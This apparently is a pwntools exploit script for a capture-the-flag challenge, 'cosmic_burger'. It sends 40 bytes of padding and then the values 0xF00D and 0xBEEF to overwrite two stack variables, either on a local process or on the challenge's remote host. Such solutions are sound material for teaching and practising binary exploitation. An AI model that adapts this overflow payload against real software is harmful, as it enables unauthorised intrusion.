#!/usr/bin/env python3
from pwn import *

exe = ELF("cosmic_burger")
context.binary = exe
context.arch = 'amd64'
context.os = 'linux'

HOSTNAME = 'offsec.m0lecon.it'
PORT = 13537


OFFSET_TO_CHEESE = 40
OFFSET_TO_SAUCE= 44

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote(HOSTNAME, PORT)
    return r

def main():
    r = conn()

    r.recvuntil(b"What's your order?\n")

    payload = flat(
        b'A' * OFFSET_TO_CHEESE,
        p32(0xF00D),     # cheese at offset 40
        p32(0xBEEF),     # sauce at offset 44
    )

    r.sendline(payload)
    r.interactive()

if __name__ == "__main__":
    main()